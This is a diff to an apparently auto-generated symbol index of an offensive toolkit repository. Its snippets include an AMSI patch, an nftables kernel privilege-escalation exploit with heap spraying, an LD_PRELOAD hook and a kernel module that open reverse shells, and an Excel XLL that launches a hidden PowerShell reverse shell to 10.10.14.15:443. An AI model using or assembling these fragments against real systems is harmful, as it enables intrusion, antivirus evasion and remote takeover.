@@ -210,7 +210,12 @@
   - `AMS1patch_E_HANDLE` (function, line 326) `void AMS1patch_E_HANDLE(HANDLE hproc)`
   - `AMS1patch_E_OUTOFMEMORY` (function, line 378) `void AMS1patch_E_OUTOFMEMORY(HANDLE hproc)`
   - `main` (function, line 427) `int main(int argc, char** argv)`
-  - `NT_SUCCESS` (macro, line 11)
+  - `NTSTATUS` (function, line 19) `typedef NTSTATUS(WINAPI *NtProtectVirtualMemoryType)( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);`
+  - `printf` (function, line 44) `printf("Failed to get procedure address\n");`
+  - `exit` (function, line 45) `exit(1);`
+  - `ZeroMemory` (function, line 72) `ZeroMemory(Patch, 100);`
+  - `lstrcatA` (function, line 75) `lstrcatA(Patch, "\x75");`
+  - `NT_SUCCESS` (macro, line 11) `#define NT_SUCCESS(Status)`
 
 ## modules/amt_auth_bypass.py
 - Layer: utility
@@ -1533,6 +1538,12 @@
   - `keyring_payload` (struct, line 120)
   - `leak` (struct, line 126)
   - `fd_uring` (struct, line 131)
+  - `msg` (struct, line 84)
+  - `msg_header` (struct, line 90)
+  - `Msg` (struct, line 100)
+  - `user_rule_t` (struct, line 105)
+  - `nft_trans_phase` (enum, line 77)
+  - `key_serial_t` (type_alias, line 135) `typedef int32_t key_serial_t;`
   - `add_key` (function, line 144) `static inline key_serial_t add_key(const char *type, const char *description, const void *payload...`
   - `keyctl` (function, line 150) `static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long ar...`
   - `bye` (function, line 154) `void bye(char *info)`
@@ -1567,21 +1578,55 @@
   - `sema_up` (function, line 609) `void sema_up(int *sema)`
   - `sema_down` (function, line 614) `void sema_down(int *sema)`
   - `main` (function, line 619) `int main(int argc, char ** argv)`
-  - `_GNU_SOURCE` (macro, line 2)
-  - `MQUEUE_NUM` (macro, line 48)
-  - `INBOUND` (macro, line 50)
-  - `OUTBOUND` (macro, line 53)
-  - `DESC_MAX` (macro, line 54)
-  - `BUFFER` (macro, line 55)
-  - `NAMELEN` (macro, line 57)
-  - `ERROR_PREFIX` (macro, line 58)
-  - `KEY_DESC_MAX_SIZE` (macro, line 59)
-  - `PREFIX_BUF_LEN` (macro, line 61)
-  - `RCU_HEAD_LEN` (macro, line 63)
-  - `SPRAY_KEY_SIZE` (macro, line 64)
-  - `PHYSMAP_MASK` (macro, line 66)
-  - `SPRAY_SIZE` (macro, line 68)
-  - `SPRAY_NB_ENTRIES` (macro, line 70)
+  - `syscall` (function, line 148) `return syscall(__NR_add_key, type, description, payload, plen, ringid);`
+  - `puts` (function, line 157) `puts(info);`
+  - `exit` (function, line 158) `exit(-2);`
+  - `printf` (function, line 169) `printf(info, arg);`
+  - `snprintf` (function, line 181) `snprintf(key_desc, KEY_DESC_MAX_SIZE, "SPRAY-RING-%03du", i);`
+  - `memcpy` (function, line 197) `memcpy(temp+0x0, &next, 8);`
+  - `free` (function, line 286) `free(id_buffer);`
+  - `unshare` (function, line 301) `unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);`
+  - `write` (function, line 305) `write(temp, "deny", strlen("deny"));`
+  - `close` (function, line 306) `close(temp);`
+  - `nftnl_table_set_str` (function, line 331) `nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);`
+  - `nftnl_table_set_u32` (function, line 332) `nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);`
+  - `nftnl_set_set_str` (function, line 336) `nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);`
+  - `nftnl_set_set_u32` (function, line 338) `nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);`
+  - `nftnl_batch_begin` (function, line 351) `nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);`
+  - `mnl_nlmsg_batch_next` (function, line 353) `mnl_nlmsg_batch_next(batch);`
+  - `nftnl_table_nlmsg_build_payload` (function, line 360) `nftnl_table_nlmsg_build_payload(nlh, table);`
+  - `nftnl_set_nlmsg_build_payload` (function, line 367) `nftnl_set_nlmsg_build_payload(nlh, set_stable);`
+  - `nftnl_set_free` (function, line 368) `nftnl_set_free(set_stable);`
+  - `nftnl_batch_end` (function, line 370) `nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);`
+  - `err` (function, line 375) `err(1, "mnl_socket_open");`
+  - `nftnl_expr_set_str` (function, line 403) `nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");`
+  - `nftnl_expr_set_u32` (function, line 404) `nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);`
+  - `nftnl_set_add_expr` (function, line 405) `nftnl_set_add_expr(set_trigger, exprs[exprid]);`
+  - `CPU_ZERO` (function, line 440) `CPU_ZERO(&set);`
+  - `CPU_SET` (function, line 442) `CPU_SET(cpu_n, &set);`
+  - `mq_receive` (function, line 491) `mq_receive(mqdes, (char*) &msg, BUFFER, NULL);`
+  - `memset` (function, line 504) `memset(spray->mtext, 0x41, size - 0x30);`
+  - `perror` (function, line 513) `perror("msgsend failure");`
+  - `system` (function, line 578) `system("gcc -o /tmp/shell /tmp/shell.c -w");`
+  - `read` (function, line 588) `read(fd_modprobe, modprobe_name, 14);`
+  - `setvbuf` (function, line 622) `setvbuf(stdin, 0, 2, 0);`
+  - `sleep` (function, line 646) `sleep(1);`
+  - `execve` (function, line 649) `execve("/tmp/dummy", NULL, NULL);`
+  - `_GNU_SOURCE` (macro, line 2) `#define _GNU_SOURCE`
+  - `MQUEUE_NUM` (macro, line 48) `#define MQUEUE_NUM`
+  - `INBOUND` (macro, line 50) `#define INBOUND`
+  - `OUTBOUND` (macro, line 53) `#define OUTBOUND`
+  - `DESC_MAX` (macro, line 54) `#define DESC_MAX`
+  - `BUFFER` (macro, line 55) `#define BUFFER`
+  - `NAMELEN` (macro, line 57) `#define NAMELEN`
+  - `ERROR_PREFIX` (macro, line 58) `#define ERROR_PREFIX`
+  - `KEY_DESC_MAX_SIZE` (macro, line 59) `#define KEY_DESC_MAX_SIZE`
+  - `PREFIX_BUF_LEN` (macro, line 61) `#define PREFIX_BUF_LEN`
+  - `RCU_HEAD_LEN` (macro, line 63) `#define RCU_HEAD_LEN`
+  - `SPRAY_KEY_SIZE` (macro, line 64) `#define SPRAY_KEY_SIZE`
+  - `PHYSMAP_MASK` (macro, line 66) `#define PHYSMAP_MASK`
+  - `SPRAY_SIZE` (macro, line 68) `#define SPRAY_SIZE`
+  - `SPRAY_NB_ENTRIES` (macro, line 70) `#define SPRAY_NB_ENTRIES`
 
 ## modules/exploit_chain.py
 - Layer: utility
@@ -3089,10 +3134,19 @@
 - Symbols:
   - `reverse_shell` (function, line 74) `void reverse_shell(void)`
   - `execvp` (function, line 128) `int execvp(const char* filename, char* const argv[])`
-  - `_GNU_SOURCE` (macro, line 49)
-  - `ATTACKERS_IP` (macro, line 63)
-  - `SHELL_PORT` (macro, line 65)
-  - `INJECTED_CONF` (macro, line 66)
+  - `ssize_t` (function, line 69) `typedef ssize_t (*execvp_func_t)(const char *__file, char *const __argv[]);`
+  - `connect` (function, line 85) `connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));`
+  - `execle` (function, line 88) `execle( "/bin/bash", "/bin/bash", "-i", NULL, env_list );`
+  - `exit` (function, line 89) `exit(0);`
+  - `fgets` (function, line 114) `fgets(buffer, sizeof(buffer), conf);`
+  - `fclose` (function, line 121) `fclose(conf);`
+  - `close` (function, line 135) `close(fd);`
+  - `config_cleanup` (function, line 145) `config_cleanup();`
+  - `old_execvp` (function, line 146) `return old_execvp(filename, argv);`
+  - `_GNU_SOURCE` (macro, line 49) `#define _GNU_SOURCE`
+  - `ATTACKERS_IP` (macro, line 63) `#define ATTACKERS_IP`
+  - `SHELL_PORT` (macro, line 65) `#define SHELL_PORT`
+  - `INJECTED_CONF` (macro, line 66) `#define INJECTED_CONF`
 
 ## modules/network_opsec.py
 - Layer: utility
@@ -3789,6 +3843,9 @@
 - Symbols:
   - `reverse_shell_init` (function, line 12) `static int __init reverse_shell_init(void)`
   - `reverse_shell_exit` (function, line 15) `static void __exit reverse_shell_exit(void)`
+  - `call_usermodehelper` (function, line 13) `return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);`
+  - `printk` (function, line 17) `printk(KERN_INFO "Exiting\n");`
+  - `module_init` (function, line 19) `module_init(reverse_shell_init);`
 
 ## modules/revshell.c
 - Layer: utility
@@ -3797,6 +3854,8 @@
 - Symbols:
   - `xlAutoOpen` (function, line 4) `void __cdecl xlAutoOpen()`
   - `DllMain` (function, line 9) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
+  - `__declspec` (function, line 2) `__declspec(dllexport) void __cdecl xlAutoOpen(void);`
+  - `WinExec` (function, line 7) `WinExec("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.15', 443);`
 
 ## modules/rich_tui.py
 - Layer: presentation
